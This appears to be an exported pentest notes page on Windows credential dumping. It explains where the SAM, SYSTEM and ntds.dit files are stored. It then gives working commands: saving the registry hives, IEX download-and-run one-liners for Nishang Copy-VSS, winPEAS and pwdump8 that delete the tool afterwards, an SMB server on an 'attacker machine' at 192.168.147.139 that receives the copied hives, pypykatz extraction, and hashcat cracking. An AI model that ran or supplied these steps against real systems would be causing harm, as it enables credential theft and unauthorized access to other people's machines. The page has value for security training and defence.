<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SAM</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>SAM</h1><br /><strong>
      <h3>Where are stored the hashes in Windows</h3>
    </strong><br />By default, the SAM file is <span style="text-decoration:underline;">locked on a running
      system</span>, and inaccessible to all users including administrative users! Since we cannot read the file
    directly on the disk volume, there are a few alternative tricks to get hold of the data. The local security
    authentication sub-system process (LSASS.EXE) on a running windows system reads this data and caches it in
    memory.<br /><br /> LANMAN and NT Hashes are stored:<br />• in the SAM file:
    <code>C:\Windows\System32\config\sam</code><br />• in the SAM registry: <code>HKEY_LOCAL_MACHINE\SAM</code><br />•
    If an NT file system recovery was performed in the past, and the Administrator has not removed the backup data, you
    might be able to find the SAM file in the directory:<br /> ◇ %SystemRoot%\repair <br /> ◇ C:\windows\repair <br /> ◇
    C:\winnt\repair<br /> ◇ C:\Windows\System32\config\RegBack<br />• In Active Directory, password representations
    (both LANMAN and NT hashes by default) are stored in the file <code>%systemroot%\ntds\ntds.dit</code> in the Domain
    Controller.<br /> With the ntds.dit file, a penetration tester can run a suite of tools by Csaba Barta, which are
    designed for a forensics analysis of ntds.dit files. These tools have the capability to locate and pull out hashes
    from a copy of the ntds.dit file<br /><br /><strong>
      <h3>Dump hashes as normal User</h3>
    </strong><br />1. save the SAM and SYSTEM file<br /> ◇ save from registry<br />
    <div class="codebox">
      <div class="codebox">
        #powershell<br />PS&gt;&nbsp;reg&nbsp;save&nbsp;hklm\system&nbsp;&quot;$env:userprofile\desktop\SYSTEM&quot;<br />PS&gt;&nbsp;reg&nbsp;save&nbsp;hklm\sam&nbsp;&quot;$env:userprofile\desktop\SAM&quot;<br />#cmd<br />C:\&gt;&nbsp;reg&nbsp;save&nbsp;hklm\system&nbsp;&quot;%userprofile%\desktop\SYSTEM&quot;<br />C:\&gt;&nbsp;reg&nbsp;save&nbsp;hklm\sam&nbsp;&quot;%userprofile%\desktop\SAM&quot;
      </div>
    </div><br /> <br /> ◇ search with gci in paths:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;gci&nbsp;-Path&nbsp;&nbsp;C:\Windows\System32\config,%SystemRoot%\repair,C:\windows\repair,C:\winnt\repair,C:\Windows\System32\config\RegBack&nbsp;-Include&nbsp;SAM,SYSTEM&nbsp;-File&nbsp;-Recurse&nbsp;-EA&nbsp;SilentlyContinue
      </div>
    </div><br /> ◇ Use <a
      href="dump_NTDS.dit_file_stored_on_the_Domain_Controller--vssadmin_(built-in_Powershell_3.0+)--Nishang_framework_Copy-VSS.ps1_(Powershell_2.0+).html">Nishang
      Copy-VSS.ps1</a> automated script: <a
      href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1" target="_blank">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1&#39;);Copy-VSS
      </div>
    </div><br /> ◇ Search with WinPEAS: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;cmd&nbsp;filesinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1331-1.png" alt="images/1331-1.png" /></a><br />2. Copy files on the
    attacker machine<br /> 1) Create a shared smb folder on the attacker machine<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;python3&nbsp;/usr/share/doc/python3-impacket/examples/smbserver.py&nbsp;tools&nbsp;.</div>
    </div><br /> <a href=""><img src="images/1331-2.png" alt="images/1331-2.png" /></a><br /> 2) Copy file from the
    target to the attacker<br />
    <div class="codebox">
      <div class="codebox">
        copy&nbsp;C:\Users\user\Desktop\SYSTEM&nbsp;\\192.168.147.139\tools\SYSTEM<br />copy&nbsp;C:\Users\user\Desktop\SAM&nbsp;\\192.168.147.139\tools\SAM
      </div>
    </div><br /> <a href=""><img src="images/1331-3.png" alt="images/1331-3.png" /></a><br />3. Extract the hashes<br />
    To do that we can use a python version of mimikatz → <strong>pypykatz </strong><br />
    <div class="codebox">
      <div class="codebox">
        #Install&nbsp;prerequirements<br />root@kali:/#&nbsp;pip3&nbsp;install&nbsp;minidump&nbsp;minikerberos&nbsp;aiowinreg&nbsp;msldap&nbsp;winacl<br />#clone&nbsp;repo<br />root@kali:/#&nbsp;git&nbsp;clone&nbsp;https://github.com/skelsec/pypykatz.git<br />root@kali:/#&nbsp;cd&nbsp;pypykatz<br />#install<br />root@kali:/#&nbsp;python3&nbsp;setup.py&nbsp;install
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;pypykatz&nbsp;registry&nbsp;&nbsp;&lt;SYSTEM-file&gt;&nbsp;&nbsp;--sam&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>SAM-file<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1331-4.png" alt="images/1331-4.png" /></a><br />4. Crack the hash<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;hashcat&nbsp;-m&nbsp;1000&nbsp;--force&nbsp;a9fdfa038c4b75ebc76dc855dd74f0da&nbsp;/usr/share/wordlists/rockyou.txt
      </div>
    </div><br /> <a href=""><img src="images/1331-5.png"
        alt="images/1331-5.png" /></a><br /><br /><br /><br /><br /><strong>
      <h3>Dump hashes as Admin</h3>
    </strong><br />• To dump them we can execute from the Windows machine pwdump tool like this one:<br /> <a
      href="https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip" target="_blank">https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip</a><br />
    pwdump8 by Fulvio Zanetti and Andrea Petralia of blackMath.it<br /> Supported machines: Windows
    2000/XP/Vista/7/2008/8/8.1/10/2012/2016/2019<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\pwdump8\pwdump8.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\pwdump8&nbsp;-recurse&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;
      </div>
    </div><br />
  </div>
</body>

</html>